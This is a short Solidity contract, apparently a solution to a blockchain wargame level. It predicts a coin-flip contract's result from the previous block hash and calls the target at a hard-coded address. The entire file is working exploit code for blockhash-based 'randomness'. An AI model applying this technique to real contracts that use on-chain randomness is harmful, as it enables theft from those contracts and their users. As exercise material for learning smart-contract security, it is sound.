// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

// OPnce deployed, just call the win() function 10 times
contract CoinFlipWin {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function win() public {
        // current block number

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        CoinFlip coinFlipContract = CoinFlip(0x4039d4dc944F2B959549759CDE26e654C10579A1);

        bool didWin = coinFlipContract.flip(side);

        if (!didWin) {
            revert("You lost!");
        }
    }
}
